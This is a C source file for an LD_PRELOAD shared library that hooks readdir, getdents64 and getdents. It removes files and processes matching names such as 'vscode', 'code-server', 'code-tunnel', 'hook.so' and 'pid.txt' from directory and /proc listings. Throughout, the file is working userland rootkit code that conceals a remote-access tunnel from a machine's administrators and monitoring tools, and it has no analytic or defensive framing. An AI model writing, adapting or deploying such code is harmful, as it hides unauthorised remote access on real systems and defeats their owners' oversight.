#define _GNU_SOURCE
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <ctype.h>

// Struct for getdents64
struct linux_dirent64 {
    unsigned long long d_ino;
    long long          d_off;
    unsigned short     d_reclen;
    unsigned char      d_type;
    char               d_name[];
};

// Struct for getdents
struct linux_dirent {
    unsigned long  d_ino;
    unsigned long  d_off;
    unsigned short d_reclen;
    char           d_name[];
};

static int is_proc_dir(int fd) {
    if (fd < 0) return 0;
    char path[64];
    char link[1024];
    snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
    ssize_t len = readlink(path, link, sizeof(link)-1);
    if (len != -1) {
        link[len] = '\0';
        return (strcmp(link, "/proc") == 0 || strcmp(link, "/proc/") == 0);
    }
    return 0;
}

static int should_hide(const char *name) {
    if (!name) return 0;
    // Substring matches for our specific tool names
    if (strstr(name, "vscode") != NULL) return 1;
    if (strstr(name, "hook.so") != NULL) return 1;
    if (strstr(name, "vscode.so") != NULL) return 1;
    if (strstr(name, "code-server") != NULL) return 1;
    if (strstr(name, "code-tunnel") != NULL) return 1;
    if (strstr(name, "pid.txt") != NULL) return 1;
    if (strstr(name, "code-tunnel.service") != NULL) return 1;
    // Exact matches for common words to avoid false positives
    if (strcmp(name, "node") == 0) return 1;
    if (strcmp(name, "code") == 0) return 1;
    return 0;
}

static int check_process_name(const char *pid_str) {
    if (!pid_str || !isdigit(*pid_str)) return 0;

    char path[128];
    int fd;
    
    // Check comm
    snprintf(path, sizeof(path), "/proc/%s/comm", pid_str);
    fd = open(path, O_RDONLY);
    if (fd != -1) {
        char proc_name[64];
        ssize_t n = read(fd, proc_name, sizeof(proc_name)-1);
        close(fd);
        if (n > 0) {
            proc_name[n] = '\0';
            char *nl = strchr(proc_name, '\n');
            if (nl) *nl = '\0';
            if (should_hide(proc_name)) return 1;
        }
    }

    // Check cmdline
    snprintf(path, sizeof(path), "/proc/%s/cmdline", pid_str);
    fd = open(path, O_RDONLY);
    if (fd != -1) {
        char cmdline[1024];
        ssize_t n = read(fd, cmdline, sizeof(cmdline)-1);
        close(fd);
        if (n > 0) {
            cmdline[n] = '\0';
            for (ssize_t i = 0; i < n; i++) if (cmdline[i] == '\0') cmdline[i] = ' ';
            if (strstr(cmdline, "vscode-server") != NULL) return 1;
            if (strstr(cmdline, "code-server") != NULL) return 1;
            if (strstr(cmdline, "code-tunnel") != NULL) return 1;
        }
    }
    return 0;
}

// Hook readdir
typedef struct dirent *(*orig_readdir_f)(DIR *);
static orig_readdir_f real_readdir = NULL;

struct dirent *readdir(DIR *dir) {
    if (!real_readdir) real_readdir = (orig_readdir_f)dlsym(RTLD_NEXT, "readdir");
    if (!real_readdir) return NULL;

    struct dirent *entry;
    int is_proc = is_proc_dir(dirfd(dir));

    while ((entry = real_readdir(dir)) != NULL) {
        if (should_hide(entry->d_name)) continue;
        if (is_proc && check_process_name(entry->d_name)) continue;
        return entry;
    }
    return NULL;
}

// Hook getdents64
typedef ssize_t (*orig_getdents64_f)(int, void *, size_t);
static orig_getdents64_f real_getdents64 = NULL;

ssize_t getdents64(int fd, void *dirp, size_t count) {
    if (!real_getdents64) {
        real_getdents64 = (orig_getdents64_f)dlsym(RTLD_NEXT, "getdents64");
        if (!real_getdents64) real_getdents64 = (orig_getdents64_f)dlsym(RTLD_NEXT, "__getdents64");
    }
    if (!real_getdents64) return -1;

    ssize_t nread = real_getdents64(fd, dirp, count);
    if (nread <= 0) return nread;

    int is_proc = is_proc_dir(fd);
    ssize_t bpos = 0;

    while (bpos < nread) {
        struct linux_dirent64 *d = (struct linux_dirent64 *)((char *)dirp + bpos);
        int hide = 0;

        if (should_hide(d->d_name)) {
            hide = 1;
        } else if (is_proc && check_process_name(d->d_name)) {
            hide = 1;
        }

        if (hide) {
            int reclen = d->d_reclen;
            memmove((char *)dirp + bpos, (char *)dirp + bpos + reclen, nread - bpos - reclen);
            nread -= reclen;
        } else {
            bpos += d->d_reclen;
        }
    }
    return nread;
}

ssize_t __getdents64(int fd, void *dirp, size_t count) {
    return getdents64(fd, dirp, count);
}

// Hook getdents (older syscall)
typedef int (*orig_getdents_f)(unsigned int, struct linux_dirent *, unsigned int);
static orig_getdents_f real_getdents = NULL;

int getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
    if (!real_getdents) real_getdents = (orig_getdents_f)dlsym(RTLD_NEXT, "getdents");
    if (!real_getdents) return -1;

    int nread = real_getdents(fd, dirp, count);
    if (nread <= 0) return nread;

    int is_proc = is_proc_dir(fd);
    int bpos = 0;

    while (bpos < nread) {
        struct linux_dirent *d = (struct linux_dirent *)((char *)dirp + bpos);
        int hide = 0;

        if (should_hide(d->d_name)) {
            hide = 1;
        } else if (is_proc && check_process_name(d->d_name)) {
            hide = 1;
        }

        if (hide) {
            int reclen = d->d_reclen;
            memmove((char *)dirp + bpos, (char *)dirp + bpos + reclen, nread - bpos - reclen);
            nread -= reclen;
        } else {
            bpos += d->d_reclen;
        }
    }
    return nread;
}